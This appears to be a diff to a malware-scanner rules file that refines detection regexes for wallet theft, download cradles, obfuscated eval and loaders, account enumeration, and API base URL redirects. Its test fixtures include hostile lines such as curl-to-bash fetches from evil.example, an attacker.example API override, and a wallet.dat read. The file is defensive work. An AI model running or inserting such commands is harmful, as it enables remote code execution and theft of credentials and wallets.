@@ -111,9 +111,9 @@ name = "Crypto Wallet Access"
 severity = "critical"
 category = "file_access"
 description = "Crypto wallet access — crypto theft indicator"
-pattern = '''(?i)(?:wallet\.dat|["'\\/]\.(?:bitcoin|electrum)(?-u:\b)|ethereum(?:[\\/]|["'],\s*["'])keystore|exodus\.wallet|Local Extension Settings|nkbihfbeogaeaoehlefnkodbefgpgknn|bfnaelmomeimhlpmgjnjophhpkkoljpa|ejbalbakoplchlghecdalmeeeajnimhm)'''
-matches = ['''path.join(home, ".ethereum", "keystore")''', '''~/.ethereum/keystore''', '''"~/.electrum/wallets"''', '''Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn''']
-ignores = ['''e.g., PhantomJS 1.x''', '''os.path.join("~", ".ethereum", "geth.ipc")''']
+pattern = '''(?i)(?:wallet\.dat(?-u:\b)|["'\\/]\.(?:bitcoin|electrum)(?-u:\b)|ethereum(?:[\\/]|["'],\s*["'])keystore|exodus\.wallet|Local Extension Settings|nkbihfbeogaeaoehlefnkodbefgpgknn|bfnaelmomeimhlpmgjnjophhpkkoljpa|ejbalbakoplchlghecdalmeeeajnimhm)'''
+matches = ['''path.join(home, ".ethereum", "keystore")''', '''~/.ethereum/keystore''', '''"~/.electrum/wallets"''', '''Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn''', '''open(os.path.join(appdata, "Bitcoin", "wallet.dat"), "rb")''']
+ignores = ['''e.g., PhantomJS 1.x''', '''os.path.join("~", ".ethereum", "geth.ipc")''', '''const key = wallet.data.encryptionKey''']
 
 [[rule]]
 id = "KS-ACC-003"
@@ -780,15 +780,17 @@ ignores = ['''exec(open('pkg/version.py').read())''']
 # No `\b` before the verb: in `\x22irm` the `2` and `i` are both word chars.
 # `\n` excluded and `(?m)`: a match may not begin on the previous line,
 # where a comment used to hide it and shift its line number.
+# Also through sudo (`| sudo -E bash -`) and as a command substitution
+# (`bash -c "$(curl -fsSL URL)"`): the same thing without a pipe.
 [[rule]]
 id = "KS-EXE-025"
 name = "Download Cradle (fetch piped to interpreter)"
 severity = "critical"
 category = "obfuscation"
 description = "Fetches a remote script and pipes it straight into an interpreter"
-pattern = '''(?im)(?:^|[^a-z\n])(?:irm|iwr|Invoke-RestMethod|Invoke-WebRequest|curl|wget)(?:\s|\\x20)+[^|\n]{0,200}?https?://[^|\n]{0,200}?\|(?:\s|\\x20)*(?:iex|Invoke-Expression|sh|bash|zsh|python3?|node)(?-u:\b)'''
-matches = ['''powershell -Command "irm https://evil.example/a | iex"''', '''powershell\x20-Command\x20\x22irm\x20https://e.x/a\x20|\x20iex\x22''', '''curl -fsSL https://get.example.sh | sh''']
-ignores = ['''curl -o out.zip https://example.com/a.zip''']
+pattern = '''(?im)(?:^|[^a-z\n])(?:(?:irm|iwr|Invoke-RestMethod|Invoke-WebRequest|curl|wget)(?:\s|\\x20)+[^|\n]{0,200}?https?://[^|\n]{0,200}?\|(?:\s|\\x20)*(?:sudo\s+(?:-\w+\s+)*)?(?:iex|Invoke-Expression|sh|bash|zsh|python3?|node)(?-u:\b)|(?:ba|z)?sh\s+-c\s+\\?["']\$\(\s*(?:curl|wget)\s+[^|\n)]{0,200}?https?://[^|\n)]{0,200}?\))'''
+matches = ['''powershell -Command "irm https://evil.example/a | iex"''', '''powershell\x20-Command\x20\x22irm\x20https://e.x/a\x20|\x20iex\x22''', '''curl -fsSL https://get.example.sh | sh''', '''curl -sL https://evil.example/setup | sudo -E bash -''', '''/bin/bash -c "$(curl -fsSL https://evil.example/install.sh)"''', '''curl -s https://evil.example/a | python3 -''']
+ignores = ['''curl -o out.zip https://example.com/a.zip''', '''VERSION="$(curl -fsSL https://example.com/latest)"''', '''bash -c "$(cat install.sh)"''']
 
 # Hands `require` to code built at runtime: the loader half of a
 # fetch-and-run backdoor (chai-as-validated, tailwindcss-forms-component).
@@ -804,15 +806,17 @@ matches = ['''const h = new Function.constructor("require", s);''', '''const han
 ignores = ['''new Function("return this")()''']
 
 # BlankOBF and friends spell `eval` / `compile` as escapes so grep misses them.
+# The builtin `compile(`, not a method: `re.compile('\033\\[…')` is yt-dlp's
+# pattern for terminal escape sequences.
 [[rule]]
 id = "KS-EXE-027"
 name = "Escaped eval Payload"
 severity = "high"
 category = "obfuscation"
 description = "eval/exec/compile of a fully escaped string literal: obfuscated dynamic code"
-pattern = '''(?-u:\b)(?:eval|exec|compile)\s*\(\s*["']\\(?:x[0-9a-fA-F]{2}|[0-7]{3})'''
-matches = ['''_____=eval("\145\x76\x61\x6c")''']
-ignores = ['''eval("1+1")''', '''re.compile("\\d+")''']
+pattern = '''(?m)(?:(?-u:\b)(?:eval|exec)|(?:^|[^.\w\n])compile)\s*\(\s*["']\\(?:x[0-9a-fA-F]{2}|[0-7]{3})'''
+matches = ['''_____=eval("\145\x76\x61\x6c")''', '''exec(compile("\x69\x6d\x70\x6f\x72\x74", "", "exec"))''']
+ignores = ['''eval("1+1")''', '''re.compile("\\d+")''', '''ANSI = re.compile('\033\\[[^m]+m')''']
 
 # Marketplace extensions install by id; a Uri means a VSIX fetched from elsewhere.
 [[rule]]
@@ -832,20 +836,23 @@ name = "Account Enumeration Command"
 severity = "medium"
 category = "recon"
 description = "Enumerates local users, groups or privileges (system discovery reconnaissance)"
-pattern = '''(?i)(?-u:\b)(?:net\s+(?:user|localgroup)(?-u:\b)|whoami\s+/(?:priv|all|groups)(?-u:\b)|cat\s+/etc/(?:passwd|shadow)(?-u:\b)|dscl\s+\.\s+-?list\s+/Users(?-u:\b))'''
-matches = ['''execSync('whoami /priv')''', '''execSync('cat /etc/passwd')''']
-ignores = ['''path.join(root, '../../etc/passwd')''']
+# `net` is the command, not the end of a name: ".NET user controls".
+pattern = '''(?im)(?:(?:^|[^.\w\n])net\s+(?:user|localgroup)(?-u:\b)|(?-u:\b)(?:whoami\s+/(?:priv|all|groups)(?-u:\b)|cat\s+/etc/(?:passwd|shadow)(?-u:\b)|dscl\s+\.\s+-?list\s+/Users(?-u:\b)))'''
+matches = ['''execSync('whoami /priv')''', '''execSync('cat /etc/passwd')''', '''os.system("net user")''', '''net localgroup administrators''']
+ignores = ['''path.join(root, '../../etc/passwd')''', '''Windows Forms and ASP.NET user controls''']
 
 # https only: local routers (claude-code-router, LiteLLM) point at http://127.0.0.1.
+# The variable itself, not a constant named after it (`DEFAULT_OPENAI_BASE_URL`);
+# the vendor's own host as the value is dropped in `scanner::keep_hit`.
 [[rule]]
 id = "KS-EXF-016"
 name = "AI API Base URL Override"
 severity = "medium"
 category = "exfiltration"
 description = "Redirects Anthropic/OpenAI API traffic (and the API key) to a third-party host"
-pattern = '''(?:ANTHROPIC_BASE_URL|OPENAI_BASE_URL|OPENAI_API_BASE)["']?\s*[:=]\s*["'`]https://'''
-matches = ['''ANTHROPIC_BASE_URL: "https://new.aicode.us.com"''']
-ignores = ['''ANTHROPIC_BASE_URL: "http://127.0.0.1:3456"''']
+pattern = '''(?m)(?:^|[^\w\n])(?:ANTHROPIC_BASE_URL|OPENAI_BASE_URL|OPENAI_API_BASE)["']?\s*[:=]\s*["'`]?https://[^\s"'`]*'''
+matches = ['''ANTHROPIC_BASE_URL: "https://new.aicode.us.com"''', '''export ANTHROPIC_BASE_URL=https://attacker.example''', '''process.env.OPENAI_BASE_URL = `https://${host}/v1`''']
+ignores = ['''ANTHROPIC_BASE_URL: "http://127.0.0.1:3456"''', '''DEFAULT_OPENAI_BASE_URL = "https://api.openai.com/v1"''']
 
 [[rule]]
 id = "KS-FSW-002"
@@ -1071,9 +1078,12 @@ name = "Python Import-Obfuscated Loader"
 severity = "critical"
 category = "obfuscation"
 description = "zlib / base64 / marshal reached through __import__ and decoded inline: the shape of Python obfuscators"
-pattern = '''__import__\(\s*["'](?:zlib|base64|marshal|codecs|lzma|bz2)["']\s*\)\s*\.\s*(?:decompress|b64decode|b32decode|b16decode|a85decode|b85decode|loads|decode)\s*\('''
-matches = ['''_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));''']
-ignores = ['''zlib = importlib.import_module("zlib")''']
+# The decoded value goes into exec / eval / compile or another decode in the
+# same expression, or a literal is decoded: `__import__("base64").b64decode(content)`
+# alone is a helper that spares an import line.
+pattern = '''(?m)(?:(?:^|[^.\w\n])(?:exec|eval|compile)\s*\([^\n;]{0,60}?|\.\s*(?:loads|decompress|[ab]\d\ddecode|decode)\s*\(\s*)__import__\(\s*["'](?:zlib|base64|marshal|codecs|lzma|bz2)["']\s*\)\s*\.\s*(?:decompress|b64decode|b32decode|b16decode|a85decode|b85decode|loads|decode)\s*\(|__import__\(\s*["'](?:zlib|base64|marshal|codecs|lzma|bz2)["']\s*\)\s*\.\s*(?:decompress|b64decode|b32decode|b16decode|a85decode|b85decode|loads|decode)\s*\(\s*b?["'][\w+/=\\]{16}'''
+matches = ['''_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));''', '''exec(__import__('base64').b64decode(b'aW1wb3J0IG9z'))''', '''exec(marshal.loads(__import__("zlib").decompress(blob)))''', '''eval(compile(__import__('base64').b64decode(src), '<s>', 'exec'))''', '''_ = __import__('base64').b64decode(b'aW1wb3J0IG9zO29zLnN5c3RlbQ==')''']
+ignores = ['''zlib = importlib.import_module("zlib")''', '''data = __import__("base64").b64decode(content)''', '''exec(open(p).read()); raw = __import__("base64").b64decode(content)''']
 
 [[rule]]
 id = "KS-EXE-042"
